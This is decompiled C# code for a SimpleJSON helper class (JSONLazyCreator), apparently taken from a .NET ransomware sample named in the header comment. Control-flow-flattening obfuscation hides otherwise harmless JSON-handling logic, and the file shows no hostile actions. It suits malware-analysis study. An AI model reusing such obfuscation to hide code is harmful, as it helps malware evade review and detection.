// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: cDisplayClass1, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 0E93EC79-9513-4BD1-8651-98C7CADA4D7F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a7264014555068294029d5d9ceb9ee717c4d2bf523330c30cee18f18e55a0b5b.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
      this.m_Node = aNode;
      this.m_Key = (string) null;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = 1189810556;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 633190999)) % 6U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -744918227 ^ 677628130;
            continue;
          case 2:
            this.m_Node = aNode;
            num1 = (int) num2 * 1483630410 ^ 1186848706;
            continue;
          case 3:
            num1 = (int) num2 * -1449803839 ^ -1761500871;
            continue;
          case 4:
            goto label_1;
          case 5:
            this.m_Key = aKey;
            num1 = (int) num2 * 1807619910 ^ 1219421185;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = -1981716778;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -431828319)) % 12U)
        {
          case 0:
            num1 = (int) num2 * 181861751 ^ -1023230789;
            continue;
          case 1:
            num1 = -1611157789;
            continue;
          case 2:
            this.m_Node = (JSONNode) null;
            num1 = -1334722269;
            continue;
          case 3:
            flag = this.m_Key == null;
            num1 = (int) num2 * 735331176 ^ 1115590845;
            continue;
          case 4:
            goto label_1;
          case 5:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * -751679364 ^ 1023847896;
            continue;
          case 6:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * -589290177 ^ 195028863;
            continue;
          case 7:
            num1 = (int) num2 * -750242448 ^ -746237621;
            continue;
          case 8:
            int num3 = flag ? 583678450 : (num3 = 1813738144);
            num1 = num3 ^ (int) num2 * -252574319;
            continue;
          case 9:
            num1 = (int) num2 * -1319465263 ^ -169547281;
            continue;
          case 10:
            goto label_3;
          case 11:
            num1 = (int) num2 * -1409571316 ^ 2035875020;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
        JSONNode jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
label_1:
        int num1 = -166365752;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -814109957)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -136030618 ^ -2135680986;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = 417055087;
        JSONArray aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 132402611)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 1779164733 ^ -216559314;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 321386926 ^ 1469696760;
              continue;
            case 3:
              goto label_3;
            case 4:
              aVal = new JSONArray();
              aVal.Add(value);
              num1 = (int) num2 * 1538021582 ^ -1643039293;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get => (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
      set
      {
        JSONClass aVal = new JSONClass();
        aVal.Add(aKey, value);
        this.Set((JSONNode) aVal);
      }
    }

    public override void Add(JSONNode aItem)
    {
      JSONArray aVal = new JSONArray();
label_1:
      int num1 = -1354471332;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -614301958)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 541068104 ^ -1141449415;
            continue;
          case 2:
            aVal.Add(aItem);
            num1 = (int) num2 * -1912942669 ^ 609679237;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      this.Set((JSONNode) aVal);
    }

    public override void Add(string aKey, JSONNode aItem)
    {
      JSONClass aVal = new JSONClass();
      aVal.Add(aKey, aItem);
label_1:
      int num1 = -475840951;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1500811458)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -233725309 ^ 960024087;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -272693385 ^ -1141374638;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
      if (b != null)
        goto label_4;
label_1:
      int num1 = 99580777;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2050755862)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1628472119 ^ -520463080;
            continue;
          case 3:
            flag = true;
            num1 = (int) num2 * 1363271804 ^ 1848457837;
            continue;
          case 4:
            goto label_4;
          default:
            goto label_6;
        }
      }
label_6:
      return flag;
label_4:
      flag = (object) a == b;
      num1 = 99230209;
      goto label_2;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = -693691125;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -838451767)) % 4U)
        {
          case 1:
            num1 = (int) num2 * 1809340299 ^ -217843662;
            continue;
          case 2:
            flag = !(a == b);
            num1 = (int) num2 * -2131456573 ^ 1666965382;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return flag;
    }

    public override bool Equals(object obj)
    {
label_1:
      int num1 = -743281598;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1456039072)) % 6U)
        {
          case 0:
            flag = true;
            num1 = (int) num2 * 1888994412 ^ 1159765525;
            continue;
          case 1:
            num1 = (int) num2 * 45755105 ^ -796738951;
            continue;
          case 3:
            flag = (object) this == obj;
            num1 = -1640810292;
            continue;
          case 4:
            int num3 = obj == null ? 1790462318 : (num3 = 1073797945);
            num1 = num3 ^ (int) num2 * 2059192379;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
    }

    public override int GetHashCode()
    {
label_1:
      int num1 = 1342725571;
      int hashCode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 173264566)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            hashCode = base.GetHashCode();
            num1 = (int) num2 * 731025059 ^ 2101609333;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return hashCode;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1696825474;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -644411227)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 126183573 ^ -1869460126;
            continue;
          case 3:
            str = "";
            num1 = (int) num2 * 1250671325 ^ 1812729268;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 1122768622;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 442261574)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str = "";
            num1 = (int) num2 * -1081353378 ^ 361055052;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override int AsInt
    {
      get
      {
        JSONData aVal = new JSONData(0);
label_1:
        int num1 = -1912901858;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -345998916)) % 5U)
          {
            case 0:
              asInt = 0;
              num1 = (int) num2 * 122998586 ^ -1473129470;
              continue;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 280180256 ^ -1184017380;
              continue;
            case 3:
              goto label_1;
            case 4:
              num1 = (int) num2 * 1152083904 ^ -1518126336;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asInt;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override float AsFloat
    {
      get
      {
label_1:
        int num1 = -213238685;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -947814291)) % 3U)
          {
            case 1:
              this.Set((JSONNode) new JSONData(0.0f));
              asFloat = 0.0f;
              num1 = (int) num2 * -711721660 ^ -1685704964;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return asFloat;
      }
      set
      {
label_1:
        int num1 = -1826296419;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1406470707)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              this.Set((JSONNode) new JSONData(value));
              num1 = (int) num2 * -1550098769 ^ 867274187;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = 1995141676;
        JSONData aVal;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 65671249)) % 5U)
          {
            case 1:
              aVal = new JSONData(0.0);
              num1 = (int) num2 * -1555161834 ^ -1054704302;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              asDouble = 0.0;
              num1 = (int) num2 * -2116734090 ^ 2065112757;
              continue;
            case 3:
              num1 = (int) num2 * 301002067 ^ -4276007;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asDouble;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = -608314090;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2003520841)) % 4U)
          {
            case 1:
              this.Set((JSONNode) new JSONData(false));
              num1 = (int) num2 * 631101551 ^ 1363594863;
              continue;
            case 2:
              goto label_1;
            case 3:
              asBool = false;
              num1 = (int) num2 * 573174839 ^ -109493886;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asBool;
      }
      set
      {
        this.Set((JSONNode) new JSONData(value));
label_1:
        int num1 = 1415071418;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 998594923)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              num1 = (int) num2 * 1868282750 ^ -1306857270;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override JSONArray AsArray
    {
      get
      {
        JSONArray aVal = new JSONArray();
label_1:
        int num1 = 1463596851;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 759106147)) % 5U)
          {
            case 0:
              asArray = aVal;
              num1 = (int) num2 * 1810394067 ^ 298762892;
              continue;
            case 1:
              num1 = (int) num2 * -61424082 ^ 1754192292;
              continue;
            case 2:
              goto label_1;
            case 4:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 920755402 ^ -32954773;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = 2107464260;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1070726267)) % 5U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 925472358 ^ 164230770;
              continue;
            case 2:
              asObject = aVal;
              num1 = (int) num2 * 37836974 ^ -1594847265;
              continue;
            case 3:
              goto label_1;
            case 4:
              num1 = (int) num2 * 1319266961 ^ -870033575;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asObject;
      }
    }
  }
}
